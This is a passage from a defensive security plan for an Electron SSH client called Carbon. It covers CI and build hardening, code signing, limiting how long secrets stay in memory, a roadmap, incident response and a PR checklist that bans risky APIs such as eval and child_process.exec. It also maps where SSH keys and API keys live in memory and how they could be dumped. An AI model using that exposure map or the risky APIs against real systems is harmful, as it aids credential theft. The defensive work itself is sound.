#### D9.1: Pin GitHub Actions to Commit SHA

Never use `@v3` or `@main` — these can be changed without you knowing:

```yaml
# BAD
- uses: actions/checkout@v4

# GOOD
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.1.0
```

#### D9.2: Minimal CI Secrets

- Code signing keys should be in a hardware security module (HSM) or vault, not in GitHub Secrets
- Use short-lived OIDC tokens instead of long-lived secrets where possible
- Rotate publishing tokens regularly
- Use separate tokens for different operations (publish vs. read)

#### D9.3: Reproducible Builds

Strive for reproducible builds — the same source + lockfile should produce the identical binary. This lets anyone verify that the published binary matches the source code.

```bash
# Build in CI
pnpm install --frozen-lockfile
pnpm build

# Record build hashes
sha256sum dist/*.exe dist/*.dmg dist/*.AppImage > checksums.txt
```

Publish checksums alongside releases.

#### D9.4: Code Signing

| Platform | Requirement |
|----------|-------------|
| macOS | Apple Developer ID + notarization (mandatory for Gatekeeper) |
| Windows | EV code signing certificate (avoids SmartScreen warnings, provides tamper evidence) |
| Linux | GPG-signed packages + checksums |

Users should be able to verify the signature before running Carbon.

#### D9.5: Protected Branches

- `main` branch requires signed commits
- PRs require at least 1 review from a CODEOWNER
- Build pipeline files (`.github/workflows/*`, `electron-builder.yml`, `next.config.mjs`) require 2 reviews
- Direct pushes to `main` are blocked

#### D9.6: SBOM (Software Bill of Materials)

Generate and publish an SBOM with every release:

```bash
# Generate SBOM
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
```

This lets users and security researchers audit the dependency tree.

---

## 10. Memory & Runtime Attacks

### The Threat

Secrets in memory (passwords, private keys, API keys) can be extracted by:

- Memory dumps from malware or debugging tools
- Cold boot attacks (physical access to RAM)
- Swap file / page file reads
- JavaScript heap snapshots

### Current Exposure

Carbon currently holds these in memory for the app's entire lifetime:

| Secret | Where in Memory | Duration |
|--------|----------------|----------|
| SSH passwords | Zustand store, React state, WebSocket buffers | App lifetime |
| SSH private keys | Zustand store, React state, WebSocket buffers | App lifetime |
| AI API keys | Zustand store, fetch() request bodies | App lifetime |
| App lock password | localStorage read into JS variable | App lifetime |
| Terminal output (may contain secrets) | xterm.js buffer | Tab lifetime |

### Defenses

#### D10.1: Minimize Secret Residency Time

```
Ideal lifecycle of a secret:

1. User enters password in form → held in React state
2. Form submits → password sent via IPC to main process
3. React state cleared → password no longer in renderer memory
4. Main process reads password from IPC → initiates SSH connection
5. SSH library consumes password → connection established
6. Main process drops password reference → eligible for GC
7. Total time in memory: < 1 second
```

Implementation:

- Never store secrets in the global Zustand store
- Clear React form state on submit and on unmount
- Pass secrets via IPC, not WebSocket (IPC is internal to Electron, not network)
- In the main process, null out secret variables after use

#### D10.2: Use Buffers Instead of Strings for Secrets

JavaScript strings are immutable and can be copied by the GC. `Buffer` objects can be explicitly zeroed:

```javascript
// Main process — after SSH connection established
function zeroBuffer(buf) {
  if (Buffer.isBuffer(buf)) {
    buf.fill(0);
  }
}

// After connection
zeroBuffer(passwordBuffer);
zeroBuffer(privateKeyBuffer);
```

Note: This doesn't guarantee the GC hasn't already copied the data, but it reduces the window of exposure.

#### D10.3: Disable Heap Snapshots in Production

```javascript
if (!isDev) {
  // Prevent heap snapshot creation
  process.on('SIGUSR2', () => {
    // Ignore — SIGUSR2 is commonly used to trigger heap dumps
  });
}
```

#### D10.4: Lock Memory Pages (Advanced)

On Linux, use `mlock()` to prevent secret-containing pages from being swapped to disk:

```c
// Native addon
#include <sys/mman.h>
mlock(secret_ptr, secret_len);
```

This requires a native addon and is an advanced measure for high-security deployments.

---

## 11. Defense Implementation Roadmap

### Priority Matrix

| # | Defense | Threat Blocked | Effort | Impact | Priority |
|---|---------|---------------|--------|--------|----------|
| 1 | D6.1 — Network egress filtering | Supply chain exfiltration | Small | **Critical** | **P0** |
| 2 | D4.1 — Verify Electron security config | Renderer compromise → RCE | Small | **Critical** | **P0** |
| 3 | D4.7 — Electron Fuses | env var / debug attacks | Small | **Critical** | **P0** |
| 4 | D2.3 — Disable install scripts | Supply chain install-time attack | Small | **High** | **P0** |
| 5 | D4.4 — Content Security Policy | XSS, script injection | Small | **High** | **P0** |
| 6 | D7.2 — WebSocket session tokens | Local process WebSocket hijack | Small | **High** | **P0** |
| 7 | D4.3 — Minimal preload API surface | Renderer → main escalation | Medium | **Critical** | **P1** |
| 8 | D5.3 — Validate IPC/WS payloads | Injection, prototype pollution | Medium | **High** | **P1** |
| 9 | D6.4 — Encrypt all data at rest | Filesystem credential theft | Large | **Critical** | **P1** |
| 10 | D2.1 — Lock to exact versions | Silent dependency upgrade | Small | **Medium** | **P1** |
| 11 | D2.2 — Strict pnpm settings | Dependency scope creep | Small | **Medium** | **P1** |
| 12 | D3.3 — Minimize secret lifetime | Memory dump credential theft | Medium | **High** | **P1** |
| 13 | D9.1 — Pin GH Actions to SHA | CI supply chain attack | Small | **High** | **P1** |
| 14 | D4.2 — Restrict navigation | Renderer navigation hijack | Small | **Medium** | **P2** |
| 15 | D3.4 — Detect debugger attachment | Debug-based credential extraction | Small | **Medium** | **P2** |
| 16 | D7.3 — Code signing + update verification | Update channel hijack | Medium | **High** | **P2** |
| 17 | D3.7 — Startup integrity check | Binary tampering | Medium | **High** | **P2** |
| 18 | D9.4 — Code signing (all platforms) | Distribution tampering | Medium | **High** | **P2** |
| 19 | D5.5 — Ban dangerous APIs (lint rule) | RCE via eval/exec | Small | **Medium** | **P2** |
| 20 | D10.1 — Minimize secret residency | Memory attack window | Medium | **Medium** | **P2** |
| 21 | D2.6 — Socket.dev monitoring | Ongoing supply chain threats | Small | **Medium** | **P3** |
| 22 | D6.5 — Credential access audit log | Forensic trail | Small | **Low** | **P3** |
| 23 | D8.2 — Certificate pinning | API MITM | Medium | **Medium** | **P3** |
| 24 | D3.6 — Clipboard protection | Clipboard hijack | Small | **Low** | **P3** |
| 25 | D9.6 — SBOM generation | Transparency, audit | Small | **Low** | **P3** |

### Phase 1: Immediate Hardening (Week 1-2)

**Goal:** Block the most impactful attacks with minimal code changes.

1. **Network egress allowlist** — Add `session.webRequest.onBeforeRequest` filter (D6.1)
2. **Verify Electron config** — Assert `nodeIntegration: false`, `contextIsolation: true`, `sandbox: true` (D4.1)
3. **Electron Fuses** — Disable `RunAsNode`, `NodeOptions`, `NodeCliInspect` (D4.7)
4. **CSP header** — Add strict Content-Security-Policy (D4.4)
5. **Disable npm install scripts** — Set `ignore-scripts=true` in `.npmrc`, whitelist only needed packages (D2.3)
6. **WebSocket auth token** — Generate random token, require on connection (D7.2)

### Phase 2: Credential Hardening (Week 3-6)

**Goal:** Move all secrets out of localStorage and into the system keychain.

1. **Implement OS keychain adapter** (`security-improvements.md` Finding #7)
2. **Remove base64 fallback** (`security-improvements.md` Finding #2)
3. **Remove secrets from Connection type** — fetch from keychain on demand
4. **Move AI API keys to main process** — never send to renderer
5. **IPC payload validation** — zod schemas for all channels (D5.3)
6. **Preload API audit** — minimize exposed surface (D4.3)

### Phase 3: Supply Chain & Build (Week 7-10)

**Goal:** Harden the entire build and distribution pipeline.

1. **Pin all dependency versions** (D2.1)
2. **Strict pnpm settings** (D2.2)
3. **Pin GitHub Actions to SHA** (D9.1)
4. **Code signing** for all platforms (D9.4)
5. **Auto-update signature verification** (D7.3)
6. **Socket.dev integration** for dependency monitoring (D2.6)
7. **SBOM generation** (D9.6)

### Phase 4: Defense in Depth (Week 11+)

**Goal:** Layer additional protections and monitoring.

1. **Secret lifecycle management** — minimize memory residency (D10.1)
2. **Certificate pinning for AI APIs** (D8.2)
3. **Debugger detection** in production (D3.4)
4. **Binary integrity check** on startup (D3.7)
5. **Dangerous API lint rules** (D5.5)
6. **Credential access audit log** (D6.5)
7. **Runtime integrity monitoring** (D7.5)

---

## 12. Incident Response Plan

### If a Dependency Is Compromised

1. **Immediately:** Pin to the last known-good version in `pnpm-lock.yaml`
2. **Assess:** Determine if the compromised version was ever used in a released build
3. **Notify:** If yes, notify all users to update immediately
4. **Audit:** Check if the malicious code could have exfiltrated data
5. **Rotate:** If credentials may have been exfiltrated, recommend all users rotate their SSH keys and API keys
6. **Post-mortem:** Document the incident and add detection for similar attacks

### If Carbon Binary Is Compromised

1. **Revoke:** Revoke the compromised code signing certificate
2. **Rebuild:** Build from a verified clean source
3. **Publish:** Push emergency update signed with new certificate
4. **Notify:** Direct notification to all users (not just in-app — email, website banner)
5. **Audit:** Forensic analysis of what the compromised binary could have done

### If User Reports Suspicious Behavior

1. **Collect:** App logs (sanitized), list of installed extensions, OS version
2. **Isolate:** Recommend user disconnect all SSH sessions immediately
3. **Analyze:** Compare reported behavior against known attack patterns
4. **Respond:** Provide specific guidance based on analysis

### Credential Rotation Guidance for Users

If a compromise is confirmed or suspected, users must:

1. **SSH keys:** Generate new key pairs, remove old public keys from all `authorized_keys` files
2. **SSH passwords:** Change on all servers
3. **AI API keys:** Rotate immediately via provider dashboard
4. **App lock password:** Change and verify biometric setup
5. **Server audit:** Run Security Guard scan on all connected servers to check for unauthorized access

---

## Appendix A: Quick Reference — What to Check in Every PR

- [ ] No new `eval()`, `new Function()`, `innerHTML` with user data
- [ ] No new `child_process.exec` (use `execFile` without shell)
- [ ] No new IPC channels without validation
- [ ] No secrets logged or console.log'd
- [ ] No new dependency without security review
- [ ] No version range (`^`, `~`) in package.json
- [ ] No changes to `.npmrc`, `electron-builder.yml`, or GitHub Actions without 2 reviews
- [ ] No `nodeIntegration`, `enableRemoteModule`, or `contextIsolation` changes
- [ ] No hardcoded secrets, tokens, or keys
- [ ] CSP not weakened (no `unsafe-eval`, no `*` origins)

## Appendix B: Tools & Services

| Tool | Purpose | Cost |
|------|---------|------|
| **Socket.dev** | npm supply chain monitoring | Free tier available |
| **Snyk** | Dependency vulnerability scanning | Free for open source |
| **electron-builder** | Secure build & code signing | Free |
| **@electron/fuses** | Compile-time security flags | Free |
| **keytar** | Cross-platform keychain access | Free |
| **zod** | Runtime schema validation | Free |
| **better-npm-audit** | Enhanced npm audit | Free |
| **CycloneDX** | SBOM generation | Free |

## Appendix C: Relationship to Other Security Plans

| Document | Scope | Relationship |
|----------|-------|-------------|
| `security-improvements.md` | Internal code fixes (14 findings) | This plan builds on those findings and adds external threat defense |
| `security-guard.md` | Feature for scanning remote servers | That secures the *servers*; this document secures *Carbon itself* |
| **This document** | Defending Carbon against compromise | Comprehensive threat model + defense plan for the app and its pipeline |
